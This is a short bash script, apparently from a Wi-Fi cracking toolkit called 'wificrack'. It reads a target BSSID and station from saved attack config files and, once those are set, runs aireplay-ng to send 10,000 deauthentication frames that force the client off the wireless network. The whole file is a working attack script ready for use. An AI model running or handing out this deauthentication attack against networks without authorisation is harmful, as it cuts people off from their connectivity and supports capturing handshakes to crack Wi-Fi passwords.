#!/bin/bash

PWD="$(pwd)"
INTERFACE="$1"

CONFIG_DIR="$HOME/.wificrack"
CONFIG_FILE="$CONFIG_DIR/config.conf"

source "$CONFIG_FILE"
source "$CURRENT_ATTACK_FILE"
source "$CONFIG_ATTACK"

echo "
BSSID: $BSSID
STATION: $STATION
INTERFACE: $INTERFACE
"

EXIT="0"
ERRO_MSG=""
if [ -z "$BSSID" ]; then
    EXIT=1
    ERRO_MSG="
$ERRO_MSG
BSSID INVALID!!!"
fi
if [ -z "$INTERFACE" ]; then
    EXIT=1
    ERRO_MSG="
$ERRO_MSG
INTERFACE INVALID!!!"
fi
if [ -z "$STATION" ]; then
    EXIT=1
    ERRO_MSG="
$ERRO_MSG
STATION INVALID!!!"
fi

if [ "$EXIT" = "1" ]; then
    $TERMINAL "echo \"$ERRO_MSG\" ; bash"
else
    aireplay-ng --deauth 10000 -a "$BSSID" -c "$STATION" "$INTERFACE"
fi

